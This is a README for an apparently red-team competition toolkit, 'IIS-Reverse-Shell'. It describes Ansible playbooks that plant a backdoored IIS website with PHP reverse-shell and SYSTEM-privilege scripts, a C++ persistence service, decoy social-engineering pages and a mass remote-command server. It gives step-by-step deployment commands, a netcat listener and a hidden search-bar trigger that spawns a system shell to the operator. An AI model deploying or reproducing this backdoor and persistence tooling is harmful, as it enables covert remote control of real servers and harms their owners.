# IIS-Reverse-Shell

## Overview
This project demonstrates advanced penetration testing techniques against IIS web servers, focusing on reverse shell deployment, privilege escalation, and persistence mechanisms. It includes:

- **Ansible Playbooks**: Automate the deployment and configuration of IIS servers across multiple targets
- **PHP Scripts**: Facilitate reverse shell functionality and SYSTEM privilege escalation
- **Website Content**: Professional-looking HTML and assets for social engineering
- **Persistence Mechanisms**: C++ Windows service for maintaining long-term access
- **Mass RCE Capabilities**: Python server for coordinated command execution across multiple compromised hosts

## Repository Structure

<pre>IIS-Reverse-Shell/
├── Ansible/
│   ├── iis_setup.yml
│   ├── inventory.yml
│   └── ansible.cfg
├── Images/
│   ├── UB_Lockdown/
│   ├── IRSEC/
│   └── Empire State Health/
├── PHP/
│   ├── contact.php
│   ├── search.php
│   └── php.ini
├── Persistence/
│   ├── Main.cpp
│   ├── Service.h
│   ├── Service.cpp
│   ├── Persistence.h
│   ├── Persistence.cpp
│   └── IISManagerService.exe
├── Website/
│   ├── UB_Lockdown/
│   │   ├── UB_Lockdown.html
│   │   ├── button.js
│   │   └── web.config
│   ├── IRSEC/
│   │   ├── IRSEC.html
│   │   ├── button.js
│   │   └── web.config
│   └── Empire State Health/
│       ├── Empire State Health.html
│       ├── button.js
│       └── web.config
└── server.py
</pre>

### Directory Breakdown
- **`Ansible/`**: Contains playbooks and inventory files for automating server setup.
- **`Images/`**: Directory with images used in the website.
- **`PHP/`**: Contains the PHP script for the reverse shell.
- **`Persistence/`**: Contains the C++ executable service that maintains persistence on the server.
- **`Website/`**: HTML and CSS files for the website's frontend.
- **`server.py`**: A Python Client that allows for mass remote command execution.

## Setup Instructions

### Prerequisites
- **Ansible**: Installed on the control machine.
- **Windows Server**: With WinRM running and enabled.
- **Network Configuration**: Ensure the server is accessible and that required ports are properly configured.
- **Required Packages**:
  ```sh
  sudo apt install git
  sudo apt install software-properties-common
  sudo add-apt-repository ppa:ansible/ansible --yes --update
  sudo apt install ansible
  sudo apt install python3-pip
  ansible-galaxy collection install ansible.windows community.windows
  pip install inquirerpy
  pip install pywinrm
  ```

### Steps

## 1. Clone the Repository
```bash
cd ~
git clone https://github.com/Lcdemi/IIS-Reverse-Shell
cd IIS-Reverse-Shell/Ansible
```

## 2. Configure Ansible Inventory
Edit the inventory.yml file to include your server's details:

```yaml
all:
  hosts:
  children:
    winserver:
      hosts:
        [IP_1]:
        [IP_2]:
        ...
    win10:
      hosts:
        [IP_1]:
        [IP_2]:
        ...
  vars:
    ansible_user: your_username
    ansible_password: your_password
    ansible_connection: winrm
    ansible_port: 5985
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
```

## 3. Configure Competition Name
Edit the iis_setup.yml file to include the name of the Competition:

```yaml
 name: IIS Reverse Shell Server Configuration
  hosts: all
  gather_facts: true
  vars:
    Competition: "[Your Competition Name]"
```

## 4. Run the Ansible Playbook
To set up the IIS server and deploy the website, execute the following command:

```sh
ansible-playbook -i inventory.yml iis_setup.yml
```

## 5a. Spawn a Reverse Shell (Singular Execution)
To spawn a reverse shell, follow these steps:

1. **Set Up a Listener**: On your machine, start a listener using a tool like `netcat`. For example:
   ```bash
   nc -lvnp [PORT]
   ```
2. **Trigger the Reverse Shell**: Once the deployment is complete, open your browser and navigate to: http://your_server_ip/. On the deployed website, locate the search bar. Enter the following command:
    ```html
    search [YOUR_IP] [PORT]
    ```
    Replace `[YOUR_IP]` with your machine's IP address and `[PORT]` with the port you are listening on (e.g., `8080`).

3. **Gain Access**: Once the command is executed, a system shell will be spawned, and you will have access to the target machine.

## 5b. OS Command Injection (Mass Execution)
For large-scale operations or testing multiple targets simultaneously, use the included `server.py` Python script to automate command execution across multiple compromised hosts.

### Server.py Features
- **Mass RCE**: Execute commands on multiple targets simultaneously
- **Concurrent Processing**: Handle multiple connections efficiently
- **Command Queueing**: Queue commands for execution across all connected hosts
- **Real-time Output**: Live output from all connected systems
- **Session Management**: Track active reverse shell sessions

### Usage

#### Starting the Mass RCE Server
```bash
# Start the RCE server on a specific port
python server.py -p 8888

# Or use default port 8888
python server.py
